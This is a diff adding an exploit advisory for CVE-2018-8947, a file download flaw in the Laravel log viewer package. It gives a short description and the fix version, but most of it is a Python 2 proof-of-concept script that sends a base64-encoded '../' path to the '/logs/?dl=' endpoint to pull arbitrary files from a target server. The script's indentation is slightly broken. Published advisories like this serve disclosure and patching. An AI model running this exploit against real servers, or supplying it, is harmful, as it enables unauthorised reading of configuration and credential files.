@@ -1,0 +1,53 @@
+# Exploit Title: Laravel log viewer by rap2hpoutre local file download (LFD)
+# Date: 23/02/2018
+# Exploit Author: Haboob Team
+# Software Link: https://github.com/rap2hpoutre/laravel-log-viewer/tree/v0.11.1
+# Version: v0.12.0 and below
+# CVE : CVE-2018-8947
+
+ 
+1. Description
+   
+Unauthorized user can access Laravel log viewer by rap2hpoutre and use download function to download any file with laravel permission, by base64 encode the wanted file.
+ 
+   
+2. Proof of Concept
+ 
+#After providing the url of the vulnerable laravel log viewer by rap2hpoutre (with / in the end or you can edit it yourself), and the file wanted including "../" the script will create a folder and save the downloaded file there
+ 
+import os
+import base64
+from urllib2 import urlopen, URLError, HTTPError
+import argparse
+import cookielib
+parser = argparse.ArgumentParser(description='_0_ Laravel 0Day _0_')
+parser.add_argument("-u", action="store", dest="url", help="Target URL", required=True)
+parser.add_argument("-f", action="store", dest="file", help="Target File", required=True)
+
+args = parser.parse_args()
+url = str(args.url).strip()+"/logs/?dl="
+final_file= args.file
+if not os.path.exists("./0Grats0"):
+    os.makedirs("./0Grats0")
+
+word = str(args.file).split('/')
+word1= "./0Grats0/"+word[-1]
+finalee=url+base64.b64encode(final_file)
+
+try:
+    f = urlopen(finalee)
+        with open(word1, "wb") as local_file:
+            local_file.write(f.read())
+except HTTPError, e:
+        print "HTTP Error:", e.code, finalee
+except URLError, e:
+        print "URL Error:", e.reason, finalee
+ 
+ 
+ 
+ 
+   
+3. Solution:
+   
+Update to version v0.13.0
+https://github.com/rap2hpoutre/laravel-log-viewer/releases/tag/v0.13.0
